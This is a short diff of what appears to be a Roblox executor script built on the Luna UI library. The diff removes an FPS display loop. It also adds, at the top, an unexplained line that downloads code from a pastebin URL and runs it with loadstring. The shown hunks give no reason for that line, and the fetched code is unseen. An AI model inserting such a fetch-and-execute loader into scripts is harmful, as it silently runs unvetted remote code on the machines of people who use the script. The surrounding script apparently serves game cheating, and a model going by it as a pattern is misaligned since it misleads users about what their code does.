@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/M5ASu6cf', true))()
+
 local Luna = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Softworks/Luna-Interface-Suite/refs/heads/main/source.lua", true))()
 
 Luna:Notification({
@@ -319,21 +321,6 @@ local sTab = Window:CreateTab({
 })
 
 sTab:CreateDivider()
-
-local function GetFPS()
-    return math.floor(workspace:GetRealPhysicsFPS())
-end
-
-local Paragraph = Tab:CreateParagraph({
-    Title = "FPS:0"
-})
-
-while true do
-    Paragraph:Set({
-        Title = "FPS:" .. GetFPS()
-    })
-    task.wait(0.1)
-end
 
 local selectedOption
 
